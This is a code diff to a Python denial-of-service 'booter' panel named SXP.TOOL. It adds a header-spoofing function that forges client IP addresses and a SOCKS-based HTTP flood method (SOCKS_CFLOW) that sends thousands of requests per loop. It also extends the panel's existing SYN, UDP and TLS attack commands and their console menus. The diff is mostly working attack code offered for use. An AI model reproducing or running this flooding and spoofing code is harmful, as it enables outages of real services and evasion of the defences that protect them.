@@ -1,7 +1,7 @@
 from colored import fg,bg,attr
-import socket,ssl,threading,random,string,sys,warnings,time,requests
+import socket,ssl,threading,random,string,sys,warnings,time,requests,socks
 from urllib.parse import urlparse
-import platform,os,struct
+import platform,os
 from colorama import Fore
 from other_data import FILES_MAKER,GET_TIME
 
@@ -44,6 +44,25 @@ def generate_url_path_choice(num):
     for _ in range(int(num)):
         data += random.choice(letter)
     return data
+
+def spoof(target):
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return (
+        "X-Forwarded-Proto: Http\r\n"
+        f"X-Forwarded-Host: {target}, 1.1.1.1\r\n"
+        f"Via: {spoofip}\r\n"
+        f'True-Client-IP: {spoofip}\r\n'
+        f"Client-IP: {spoofip}\r\n"
+        f'X-Forwarded-For: {spoofip}\r\n'
+        f'Real-IP: {spoofip}\r\n'
+        f'X-Real-IP: {spoofip}\r\n'
+    )
 
 def SYN_ATTACK(ip,port,booter):
     global stop_command
@@ -198,6 +217,40 @@ def SSL_PACKET(target,methods,duration_sec_attack_dude):
         except:
            pass
 
+def socks_cflow(secs, target, methods):
+    global stop_command
+    url_path = generate_url_path(1)
+    payload = f"{methods} /{url_path} HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: type\r\nOrigin: type\r\nReferrer: type\r\n{spoof(target['host'])}\r\n".replace('type',"".join(random.sample(str(string.ascii_lowercase), int(4)))).encode()
+    try:
+        if target['scheme'] == 'https':
+         packet = socks.socksocket()
+         packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
+         packet.settimeout(65536)
+         packet.connect((str(target['host']), int(target['port'])))
+         packet.connect_ex((str(target['host']), int(target['port'])))
+         packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+        else:
+         packet = socks.socksocket()
+         packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
+         packet.settimeout(65536)
+         packet.connect((str(target['host']), int(target['port'])))
+         packet.connect_ex((str(target['host']), int(target['port'])))
+
+        while time.time() < secs:
+          if stop_command:
+            break
+          for _ in range(2500):
+                if stop_command:
+                 break
+                packet.send(payload)
+                packet.sendall(payload)
+    except:
+        try:
+            packet.close()
+            pass
+        except:
+            pass
+
 status_code = False
 def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
     global status_code,stop_command
@@ -335,19 +388,18 @@ def RUNNING_HTTPS_ALL(methods_leak,thread_made,target,time_booter,METHODS):
            threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter)).start()
         elif methods_leak == 'TLS_TEST':
            threading.Thread(target=tls_test, args=(target, time_booter,METHODS)).start()
+        elif methods_leak == 'SOCKS_CFLOW':
+           threading.Thread(target=socks_cflow, args=(time_booter,target,METHODS)).start()
+        elif methods_leak == 'HTTPS_ALL':
+           threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS)).start()
+           threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter)).start()
+           threading.Thread(target=tls_test, args=(target, time_booter,METHODS)).start()
         else:
            threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS)).start()
            threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter)).start()
            threading.Thread(target=tls_test, args=(target, time_booter,METHODS)).start()
-  
-def calculate_checksum(packet):
-    total = 0
-    for i in range(0, len(packet), 2):
-        total += (packet[i] << 8) + packet[i+1]
-    total = (total & 0xffff) + (total >> 16)
-    checksum = (~total) & 0xffff
-    return checksum
-           
+           threading.Thread(target=socks_cflow, args=(time_booter,target,METHODS)).start()
+
 def CLI_COLOR(mode):
     global target_load,port_load,methods_load
     try:
@@ -357,6 +409,15 @@ def CLI_COLOR(mode):
     # GUI you can replace its
     if mode == 'banner':
      print(f"""{fg(40)}        ╔═╗{fg(41)}═╗ ╦{fg(42)}╔═╗{fg(43)}┌┬┐{fg(44)}┌─┐{fg(45)}┌─┐{fg(80)}┬  \n{fg(40)}        ╚═╗{fg(41)}╔╩╦╝{fg(42)}╠═╝{fg(43)} │ {fg(44)}│ │{fg(45)}│ │{fg(80)}│  \n{fg(40)}        ╚═╝{fg(41)}╩ ╚═{fg(42)}╩ {fg(7)}o{fg(43)} ┴ {fg(44)}└─┘{fg(45)}└─┘{fg(80)}┴─┘{attr(0)}""")
+    elif mode == 'loading':
+       print(f'{fg(196)}[ {fg(40)}S{fg(41)}X{fg(42)}P{fg(165)} {fg(196)}] {fg(214)}LOADING {fg(215)}.{attr(0)}')
+       time.sleep(0.5)
+       print(f'{fg(196)}[ {fg(40)}S{fg(41)}X{fg(42)}P{fg(165)} {fg(196)}] {fg(214)}LOADING {fg(215)}. {fg(216)}.{attr(0)}')
+       time.sleep(0.5)
+       print(f'{fg(196)}[ {fg(40)}S{fg(41)}X{fg(42)}P{fg(165)} {fg(196)}] {fg(214)}LOADING {fg(215)}. {fg(216)}. {fg(217)}.{attr(0)}')
+       time.sleep(0.5)
+       print(f'{fg(196)}[ {fg(40)}S{fg(41)}X{fg(42)}P{fg(165)} {fg(196)}] {fg(202)}WELCOME {fg(203)}TO {fg(204)}SXP.TOOL {fg(205)}PANEL {fg(196)}[ {fg(40)}S{fg(41)}X{fg(42)}P{fg(165)} {fg(196)}]{attr(0)}')
+       time.sleep(1.5)
     elif mode == 'l4':
        print(f'''{fg(196)}          ╔═╗{fg(197)}═╗ ╦{fg(198)}╔═╗{fg(199)}┌┬┐{fg(200)}┌─┐{fg(201)}┌─┐{fg(207)}┬  \n{fg(196)}          ╚═╗{fg(197)}╔╩╦╝{fg(198)}╠═╝ {fg(199)}│ {fg(200)}│ │{fg(201)}│ │{fg(207)}│  \n{fg(196)}          ╚═╝{fg(197)}╩ ╚═{fg(198)}╩ {fg(210)}o {fg(199)}┴{fg(200)} └─┘{fg(201)}└─┘{fg(207)}┴─┘\n  {fg(160)}╔═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╗\n{fg(214)}▀ {fg(160)}║ {fg(213)}━ {fg(212)}━ {fg(211)}━ {fg(210)}━ {fg(209)}━ {fg(196)}MET{fg(197)}HODS {fg(198)}LAY{fg(199)}ER4 {fg(209)}━ {fg(210)}━ {fg(211)}━ {fg(212)}━ {fg(213)}━ {fg(163)}║ {fg(214)}▀\n{fg(196)}█ {fg(160)}╚═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╝ {fg(196)}█\n{fg(197)}╚═══════╗ ╔═══════════════════╗ ╔════════╝\n{fg(198)}  ▀═══╗ ║▀║    {fg(202)}TCP {fg(203)}UDP {fg(204)}TUP    {fg(198)}║▀║ ╔═══▀\n{fg(199)}    ╗ ║ ║█║        {fg(208)}SYN        {fg(199)}║█║ ║ ╔\n{fg(200)}      ▀ ║ ╚═══════════════════╝ ║ ▀ \n{fg(201)}        ▀═══════════════════════▀{attr(0)}''')
     elif mode == 'main_banner':
@@ -367,11 +428,13 @@ def CLI_COLOR(mode):
       print(f"""{fg(202)}╔═══{fg(208)}══════{fg(209)}══════════════{fg(210)}════════════╦═══{fg(211)}╗╗\n{fg(202)}║   {fg(112)}MENU {fg(113)}- {fg(114)}LIST {fg(115)}OF {fg(116)}COMMAND {fg(117)}- {fg(87)}MENU  {fg(210)} ║ {fg(1)}X{fg(211)} ║║\n{fg(202)}╠══{fg(208)}═════{fg(209)}══════════════════════{fg(210)}══════╩═══{fg(211)}╣║\n{fg(202)}║ {fg(1)}━ {fg(9)}REQUIRES PARAMETER   {fg(3)}- {fg(11)}NOT REQUIRES{fg(211)} ║║\n{fg(202)}╠════════{fg(208)}═══════════{fg(209)}════════{fg(210)}════════════{fg(211)}╣║\n{fg(202)}║    {fg(112)}HELP {fg(3)}- {fg(117)}For show some command.   {fg(211)}   ║║\n{fg(202)}║    {fg(113)}MENU {fg(3)}- {fg(116)}Return to main panel.    {fg(211)}   ║║\n{fg(202)}║    {fg(114)}PING {fg(3)}- {fg(115)}For check target.       {fg(211)}    ║║\n{fg(202)}║ {fg(115)}METHODS {fg(1)}━ {fg(114)}Show methods.            {fg(211)}   ║║\n{fg(202)}║ {fg(116)}   STOP {fg(1)}- {fg(113)}For stop attack            {fg(211)} ║║\n{fg(202)}║ {fg(117)}   EXEC {fg(1)}- {fg(112)}For execute command.       {fg(211)} ║║\n{fg(202)}║     {fg(118)}CLS {fg(3)}- {fg(111)}Clear console.            {fg(211)}  ║║\n{fg(202)}║    {fg(119)}EXIT {fg(1)}- {fg(110)}For exit this panel. {fg(211)}       ║║\n{fg(202)}╚════{fg(208)}════════{fg(209)}═════════════{fg(210)}══════════{fg(211)}════╝╝{attr(0)}\n""")
     elif mode == 'atk':
       print(f"""{fg(41)}SEND {fg(42)}DOS {fg(43)}TO {fg(44)}TARGET {fg(45)}[{fg(196)}METHODS {fg(45)}- {fg(136)}{methods_load}{fg(45)}] {fg(80)}----> {fg(45)}({fg(214)}{target_load}{fg(80)}:{fg(184)}{port_load}{fg(45)}){attr(0)}""")
-
+      
 num_panel = False
 def PANEL_USE():
     global num_panel,target_load,port_load,methods_load,status_code,stop_command
     if num_panel == False:
+      CLI_COLOR('loading')
+      clear_console()
       CLI_COLOR('main_banner')
       num_panel = True
     console_prompt = input(f"{fg(115)}ROOT{fg(114)}@{fg(113)}ROOT {fg(112)}$ {attr(0)}").upper()
@@ -448,20 +511,23 @@ def PANEL_USE():
           print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
           print(f"{fg(154)}EXAMPLE USE {random.choice(('HTPMIX','HTTPS_TLS.MIX','HTMIX'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
     elif arg_load[0] == 'HTTPS_ALL' or arg_load[0] == 'HTPALL' or arg_load[0] == 'HTALL':
-       if len(arg_load) == 5:
+       if len(arg_load) == 6:
           url = str(arg_load[1]).lower()
           thread_loader = int(arg_load[2])
           time_booter = int(arg_load[3])
           mode_tls = str(arg_load[4])
+          type_mode = str(arg_load[5])
           target = get_target(url)
-          threading.Thread(target=RUNNING_HTTPS_ALL,args=('HTTP_ALL',thread_loader,target,time_booter,mode_tls)).start()
+          if type_mode == 0:
+           threading.Thread(target=RUNNING_HTTPS_ALL,args=('HTTPS_ALL',thread_loader,target,time_booter,mode_tls)).start()
+          else:
+             threading.Thread(target=RUNNING_HTTPS_ALL,args=('HTTPS_ALL2',thread_loader,target,time_booter,mode_tls)).start()
           target_load = target['host']
           port_load = target['port']
-          methods_load = 'HTTPS_ALL'
+          methods_load = f'HTTPS_ALL.{type_mode}'
           CLI_COLOR('atk')
        else:
-          print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
-          print(f"{fg(154)}EXAMPLE USE {random.choice(('HTPALL','HTTPS_ALL','HTALL'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
+          print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {fg(211)}MODE\n{fg(207)}MODE {fg(206)}OF {fg(205)}HTTPS_ALL {fg(204)}HERE {fg(202)}- {fg(70)}0 {fg(71)}IT {fg(72)}DEFAULT {fg(73)}MODE {fg(214)}( {fg(196)}OLD HTTPS_ALL {fg(214)}) {fg(45)}1{fg(44)} IT {fg(43)}NEW {fg(42)}MODE {fg(214)}( {fg(196)}NEW HTTPS_ALL {fg(214)})\n\n{fg(154)}EXAMPLE USE {random.choice(('HTPALL','HTTPS_ALL','HTALL'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {random.choice(('0','1'))} {attr(0)}")
     elif arg_load[0] == 'HTPTC' or arg_load[0] == 'HTPC' or arg_load[0] == 'HTTPS_TLS.CIPHER':
        if len(arg_load) == 5:
           url = str(arg_load[1]).lower()
@@ -492,6 +558,21 @@ def PANEL_USE():
         else:
             print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
             print(f"{fg(154)}EXAMPLE USE {random.choice(('HTTPS_RECREATE','HTPSRE'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
+    elif arg_load[0] == 'SOCKS_CFLOW' or arg_load[0] == 'SCFL':
+        if len(arg_load) == 5:
+            url = str(arg_load[1]).lower()
+            thread_loader = int(arg_load[2])
+            time_booter = int(arg_load[3])
+            mode_tls = str(arg_load[4])
+            target = get_target(url)
+            threading.Thread(target=RUNNING_HTTPS_ALL,args=('SOCKS_CFLOW',thread_loader,target,time_booter,mode_tls)).start()
+            target_load = target['host']
+            port_load = target['port']
+            methods_load = 'SOCKS_CFLOW'
+            CLI_COLOR('atk')
+        else:
+            print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
+            print(f"{fg(154)}EXAMPLE USE {random.choice(('SOCKS_CFLOW','SCFL'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
     elif arg_load[0] == 'TCP':
         if len(arg_load) ==7:
            ip = str(arg_load[1])
@@ -550,7 +631,7 @@ def PANEL_USE():
           methods_load = 'UDP'
           CLI_COLOR('atk')
        else:
-          print(f'{fg(40)}HIT {fg(41)}900+ {fg(42)}MB {fg(43)}PUT {fg(44)}65507 {fg(45)}IN {fg(50)}SIZE {fg(51)}( SUPPORT ONLY CLOUDSHELL )\n{fg(196)}UDP {fg(197)}<IP> {fg(198)}<PORT> {fg(199)}<TIME> {fg(200)}<BOOTER> {fg(201)}<SIZE>{attr(0)}')
+          print(f'{fg(40)}HIT {fg(41)}890+ {fg(42)}MB {fg(43)}PUT {fg(44)}64999 {fg(45)}IN {fg(50)}SIZE {fg(51)}( SUPPORT ONLY CLOUDSHELL )\n{fg(196)}UDP {fg(197)}<IP> {fg(198)}<PORT> {fg(199)}<TIME> {fg(200)}<BOOTER> {fg(201)}<SIZE>{attr(0)}')
     elif arg_load[0] == 'EXEC':
        mode_attack = input("LOAD SCRIPT (FILES or INPUT) $").upper()
        if mode_attack == 'INPUT':
@@ -592,7 +673,7 @@ def PANEL_USE():
           print(f'{fg(202)}STOP {fg(203)}ATTACK {fg(204)}IT {fg(205)}TRUE{attr(0)}')
           stop_command = True
     elif arg_load[0] == 'PING':
-       methods_type = input(f"{Fore.GREEN}MODE_PING {Fore.WHITE}({Fore.RED}l3{Fore.WHITE},{Fore.YELLOW}l4{Fore.WHITE},{Fore.LIGHTYELLOW_EX}l7{Fore.WHITE}) ${Fore.RESET}")
+       methods_type = input(f"{Fore.GREEN}MODE_PING {Fore.WHITE}({Fore.YELLOW}l4{Fore.WHITE},{Fore.LIGHTYELLOW_EX}l7{Fore.WHITE}) ${Fore.RESET}")
        if methods_type.upper() == 'L7' or methods_type.upper() == 'LAYER7' or methods_type.upper() == '7':
            tar = str(input(f"{Fore.CYAN}URL {Fore.WHITE}${Fore.RESET}"))
            try:
@@ -601,10 +682,8 @@ def PANEL_USE():
            except:
                print(f"{fg(196)}CONNECTION {fg(197)}STATUS_CODE=NULL {fg(198)}REASON=NULL{attr(0)}")
                pass
-       elif methods_type.upper() == 'L4' or methods_type.upper() == 'LAYER4' or methods_type.upper() == '4':
-
+       else:
            status_code_tcp = False
-
            IP = str(input(f'{Fore.LIGHTBLUE_EX}IP ${Fore.RESET}'))
            PORT = int(input(f'{Fore.BLUE}PORT ${Fore.RESET}'))
            try:
@@ -619,22 +698,6 @@ def PANEL_USE():
                print(f"{Fore.GREEN}CONNECTION=OK {Fore.LIGHTGREEN_EX}DATA_RECV={d.decode()}{Fore.RESET}")
            else:
                print(f"{Fore.RED}CONNECTION=NO {Fore.LIGHTRED_EX}DATA_RECV=NULL{Fore.RESET}")
-       else:
-           IP = str(input(f'{Fore.LIGHTBLUE_EX}IP ${Fore.RESET}'))
-           try:
-               ICMP = struct.pack("!BBHHH", 8, 0, 0, 0, 0)
-               icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-               icmp_socket.settimeout(1.0)
-               checksum = calculate_checksum(ICMP)
-               icmp_packet = struct.pack("!BBHHH", 8, 0, checksum, 0, 0)
-               start_time = time.time()
-               icmp_socket.sendto(icmp_packet, (IP, 0))
-               icmp_socket.recv(65536)
-               end_time = time.time()
-               rtt_ms = (end_time - start_time) * 1000
-               print(f"{Fore.GREEN}CONNECTION{Fore.WHITE}={Fore.LIGHTCYAN_EX}OK {Fore.YELLOW}( {round(rtt_ms, 2)} ms ){Fore.RESET}")
-           except TapError:
-               print(f'{Fore.RED}{IP} CONNECTION {Fore.LIGHTRED_EX}TIMEOUT . . .{Fore.RESET}')
     else:
        print(f"{fg(196)}{console_prompt} NOT FOUND COMMAND ! {attr(0)}")
     PANEL_USE()
@@ -667,4 +730,3 @@ def checker_login():
      print(f"{Fore.RED}FAILED {Fore.YELLOW}LOGIN . . .{Fore.RESET}")
      time.sleep(1)
      checker_login()
-checker_login()
